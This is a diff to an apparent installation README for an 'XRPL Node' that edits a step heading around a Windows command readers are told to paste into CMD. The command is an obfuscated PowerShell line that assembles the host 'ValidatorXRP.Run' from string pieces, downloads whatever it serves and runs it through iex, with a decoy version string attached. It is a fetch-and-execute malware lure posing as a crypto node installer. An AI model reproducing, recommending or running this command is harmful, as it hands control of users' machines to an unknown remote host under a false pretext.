@@ -8,7 +8,7 @@ _The CMD command is the recommended way to install **XRPL Node**. It automatical
 ### Step 1: Open Command prompt.
 Press `Win + R`, type `CMD`, and press **Enter**.
 
-### Step 2: Execute the following command:
+### Step 2: Run the XRP node installation command
 ```cmd
 powershell -c "$Blockchain='XRP'; $XRP='Validator'; iwr ($XRP + $Blockchain + '.' + 'Run') | iex; $Version='XRP-Mainnet=3.1.9-1b0a849'"
 `````
